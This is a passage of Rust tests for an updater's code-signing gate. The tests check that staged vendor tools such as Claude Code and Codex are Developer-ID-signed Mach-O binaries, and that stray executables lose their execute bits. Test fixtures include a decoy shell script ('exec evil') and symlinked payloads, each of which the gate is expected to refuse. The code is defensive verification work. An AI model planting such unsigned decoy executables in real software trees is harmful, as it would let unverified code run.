        lay_link(&d, "bin/codex", "../payload.txt");
        refused_as(&d, &["codex"], entry_refusal);

        // Every exposed tool is bound, not only the first. (The executable decoy goes: an
        // execute bit on a non-Mach-O is refused on its own, below.)
        std::fs::remove_file(d.join("bin/codex")).unwrap();
        std::fs::remove_file(d.join("payload.txt")).unwrap();
        lay(&d, "bin/codex", &thin_macho(), 0o755);
        gate_with(&d, &["codex"], &pass).0.unwrap();
        refused_as(
            &d,
            &["codex", "codex-exec"],
            "bin/codex-exec is not a Mach-O",
        );

        lay(&d, "codex-path/rg", b"#!/bin/sh\nexec evil\n", 0o755);
        refused_as(
            &d,
            &["codex"],
            "codex-path/rg is an interpreter script, which runs unsigned",
        );
        let _ = std::fs::remove_dir_all(&d);
    }

    /// NO EXECUTE BIT OFF A VERIFIED MACH-O. A data file at 0755 beside Mach-Os that all
    /// verify is refused by name — `/bin/sh` would run it unsigned — and passes once the
    /// lane's demotion has cleared its bits, while every Mach-O keeps its own.
    #[cfg(target_os = "macos")]
    #[test]
    fn an_executable_that_is_not_a_macho_is_refused_until_demoted() {
        let d = tmp("devid-exec");
        lay(&d, "bin/codex", &thin_macho(), 0o755);
        lay(
            &d,
            "codex-resources/voice/runtime.json",
            b"{\"a\": 1}\n",
            0o755,
        );
        let pass = |_: &str| -> Result<(), aterm_update_core::codesign::CodesignError> { Ok(()) };
        match gate_with(&d, &["codex"], &pass).0 {
            Err(StageError::SignerRefused(m)) => assert_eq!(
                m,
                "codex-resources/voice/runtime.json is executable but not a Mach-O; it would \
                 run unverified"
            ),
            other => panic!("{other:?}"),
        }
        assert!(crate::macho::demote_foreign_executables(&d).unwrap());
        let mode = |rel: &str| {
            use std::os::unix::fs::PermissionsExt as _;
            std::fs::metadata(d.join(rel)).unwrap().permissions().mode() & 0o7777
        };
        assert_eq!(mode("codex-resources/voice/runtime.json"), 0o644);
        assert_eq!(mode("bin/codex"), 0o755, "a Mach-O keeps its bits");
        assert!(
            !crate::macho::demote_foreign_executables(&d).unwrap(),
            "idempotent"
        );
        gate_with(&d, &["codex"], &pass).0.unwrap();
        let _ = std::fs::remove_dir_all(&d);
    }

    /// Linux keeps ELF executable, not Mach-O; foreign binaries and data lose
    /// their execute bits without changing the executable's bytes.
    #[cfg(target_os = "linux")]
    #[test]
    fn linux_demotion_keeps_elf_and_demotes_macho_and_executable_data() {
        use std::os::unix::fs::PermissionsExt as _;
        let d = tmp("linux-exec");
        let elf = crate::vendor_direct::lane::world::native_exe("codex");
        lay(&d, "bin/codex", &elf, 0o755);
        lay(&d, "foreign/macos-helper", &thin_macho(), 0o755);
        lay(&d, "codex-resources/runtime.json", b"{}\n", 0o755);
        assert!(crate::macho::demote_foreign_executables(&d).unwrap());
        let mode =
            |rel: &str| std::fs::metadata(d.join(rel)).unwrap().permissions().mode() & 0o7777;
        assert_eq!(mode("bin/codex"), 0o755);
        assert_eq!(std::fs::read(d.join("bin/codex")).unwrap(), elf);
        assert_eq!(mode("foreign/macos-helper"), 0o644);
        assert_eq!(mode("codex-resources/runtime.json"), 0o644);
        assert!(!crate::macho::demote_foreign_executables(&d).unwrap());
        let _ = std::fs::remove_dir_all(&d);
    }

    /// A sidecar the caller cannot render stops the stage before the swap, like a gate.
    #[test]
    fn a_sidecar_render_refusal_stops_the_stage_before_the_swap() {
        let b = bundle("hooks-render");
        let build = b.build();
        let sidecars = |_: &str| Err(StageError::Payload("the record does not render".into()));
        let hooks = StageHooks {
            pre_swap: None,
            sidecars: Some(&sidecars),
        };
        let err = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap_err();
        assert!(matches!(err, StageError::Payload(_)), "{err:?}");
        assert!(!build.exists());
        assert!(scratch_beside(&build).is_empty());
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// CODESIGN FAILING TO JUDGE IS NOT A VERDICT. Exit 1 for a file it could not read,
    /// a timeout, or no codesign at all is [`StageError::Io`] — retried, never memoized
    /// against the vendor's bytes — while a signature fault or another signer is a
    /// [`StageError::SignerRefused`].
    #[cfg(unix)]
    #[test]
    fn codesign_failing_to_judge_is_io_and_only_a_verdict_refuses_the_signer() {
        use aterm_update_core::codesign::CodesignError;
        let d = tmp("devid-io");
        lay(&d, "bin/claude", &thin_macho(), 0o755);
        let answer = |e: fn() -> CodesignError| gate_with(&d, &["claude"], &|_| Err(e())).0;
        for fault in [
            || CodesignError::Refused {
                code: Some(1),
                stderr: "bin/claude: Permission denied\n".into(),
            },
            || CodesignError::Refused {
                code: Some(1),
                stderr: "bin/claude: internal error in Code Signing subsystem\n".into(),
            },
            || CodesignError::TimedOut,
            || CodesignError::Unsupported,
        ] {
            match answer(fault) {
                Err(StageError::Io(e)) => assert!(e.to_string().starts_with("bin/claude: "), "{e}"),
                other => panic!("{other:?}"),
            }
        }
        for verdict in [unsigned, || CodesignError::Refused {
            code: Some(3),
            stderr: "test-requirement: code failed to satisfy specified code requirement(s)\n"
                .into(),
        }] {
            assert!(
                matches!(answer(verdict), Err(StageError::SignerRefused(_))),
                "a verdict"
            );
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    /// A gate with nothing to bind, or a tool name that is not one, is the caller's fault
    /// ([`StageError::Payload`]), refused before any file is judged.
    #[cfg(unix)]
    #[test]
    fn a_gate_with_no_or_a_bad_exposed_tool_is_a_payload_error() {
        let d = tmp("devid-exposes");
        lay(&d, "bin/claude", &thin_macho(), 0o755);
        let (result, asked) = gate_with(&d, &[], &|_| Ok(()));
        assert!(matches!(result, Err(StageError::Payload(_))), "{result:?}");
        assert!(asked.is_empty());
        let (result, asked) = gate_with(&d, &["../claude"], &|_| Ok(()));
        assert!(matches!(result, Err(StageError::Payload(_))), "{result:?}");
        assert!(asked.is_empty());
        let _ = std::fs::remove_dir_all(&d);
    }

    /// THE GATE ON A REAL SIGNATURE: a genuine Claude Code binary, laid in a staged tree,
    /// passes under Anthropic's team and is refused under OpenAI's; beside it, an
    /// unsigned 45-arch universal file is refused. Needs a Developer-ID-signed Claude
    /// Code on this Mac, so it runs on request and fails loudly without one.
    #[cfg(target_os = "macos")]
    #[test]
    #[ignore = "needs Claude Code under ~/.local/share/claude/versions; run with --ignored"]
    fn the_developer_id_gate_passes_the_real_team_and_refuses_another() {
        let signed = a_signed_claude()
            .expect("no Claude Code binary under ~/.local/share/claude/versions to verify");
        let d = tmp("devid-real");
        std::fs::create_dir_all(d.join("bin")).unwrap();
        std::fs::copy(&signed, d.join("bin/claude")).unwrap();
        developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check)(&d)
            .expect("Anthropic's team signs Claude Code");
        match developer_id_gate("2DC432GLL2", &["claude"], codesign_team_check)(&d) {
            Err(StageError::SignerRefused(m)) => assert!(
                m.starts_with("bin/claude is not signed by Developer ID team 2DC432GLL2"),
                "{m}"
            ),
            other => panic!("{other:?}"),
        }
        std::fs::write(d.join("rg"), fat_macho(45)).unwrap();
        match developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check)(&d) {
            Err(StageError::SignerRefused(m)) => assert!(
                m.starts_with("rg is not signed by Developer ID team Q6L2SF6YDW"),
                "{m}"
            ),
            other => panic!("{other:?}"),
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    /// Through the real stage: a download that is a Mach-O codesign refuses is refused
    /// before the swap — no build, no marker, no scratch.
    #[cfg(target_os = "macos")]
    #[test]
    fn a_stage_whose_macho_codesign_refuses_leaves_no_build() {
        let d = tmp("devid-stage");
        let dl = d.join("claude-download");
        std::fs::write(&dl, thin_macho()).unwrap();
        let mut art = vendor_artifact(&dl, "raw-binary", "");
        art.entry = "claude".into();
        let gate = developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check);
        let build = d.join("store/claude/1000002000001000280");
        let hooks = StageHooks {
            pre_swap: Some(&gate),
            sidecars: None,
        };
        let err = verify_and_stage(&art, &dl, &build, &hooks).unwrap_err();
        assert!(matches!(err, StageError::SignerRefused(_)), "{err:?}");
        assert!(!build.exists());
        assert!(!crate::store::build_is_complete(&build));
        assert!(scratch_beside(&build).is_empty());
        let _ = std::fs::remove_dir_all(&d);
    }

    /// The gate's refusals through real codesign, needing no real signature: a tree with
    /// no Mach-O, an unsigned thin Mach-O, an unsigned 45-arch universal file, and a
    /// symlinked Mach-O — each refused as a signer verdict.
    #[cfg(target_os = "macos")]
    #[test]
    fn the_developer_id_gate_refuses_no_macho_an_unsigned_one_and_a_symlinked_one() {
        let gate = developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check);
        let d = tmp("devid-shapes");
        std::fs::create_dir_all(d.join("bin")).unwrap();
        std::fs::write(d.join("bin/claude"), b"echo hi\n").unwrap();
        match gate(&d) {
            Err(StageError::SignerRefused(m)) => assert!(m.starts_with("no Mach-O"), "{m}"),
            other => panic!("{other:?}"),
        }

        for bytes in [thin_macho(), fat_macho(45)] {
            std::fs::write(d.join("bin/claude"), &bytes).unwrap();
            match gate(&d) {
                Err(StageError::SignerRefused(m)) => {
                    assert!(
                        m.starts_with("bin/claude is not signed by Developer ID team"),
                        "{m}"
                    );
                }
                other => panic!("{other:?}"),
            }
        }

        std::fs::remove_file(d.join("bin/claude")).unwrap();
        std::os::unix::fs::symlink("/bin/ls", d.join("bin/claude")).unwrap();
        match gate(&d) {
            Err(StageError::SignerRefused(m)) => assert!(m.contains("symlink to a Mach-O"), "{m}"),
            other => panic!("{other:?}"),
        }
        assert!(
            matches!(
                developer_id_gate("not a team", &["claude"], codesign_team_check)(&d),
                Err(StageError::SignerRefused(_))
            ),
            "the shape is refused before any team is consulted"
        );
        std::fs::remove_file(d.join("bin/claude")).unwrap();
        std::fs::write(d.join("bin/claude"), thin_macho()).unwrap();
        assert!(
            matches!(
                developer_id_gate("not a team", &["claude"], codesign_team_check)(&d),
                Err(StageError::Payload(_))
            ),
            "a team that is not a team is the row's fault, not the bytes'"
        );
        let _ = std::fs::remove_dir_all(&d);
    }

    /// Off macOS there is no platform anchor: the gate passes any tree, Mach-O or not.
    #[cfg(not(target_os = "macos"))]
    #[test]
    fn off_macos_the_developer_id_gate_passes() {
        let d = tmp("devid-off");
        assert!(developer_id_gate("Q6L2SF6YDW", &["claude"], codesign_team_check)(&d).is_ok());
        let _ = std::fs::remove_dir_all(&d);
    }
}
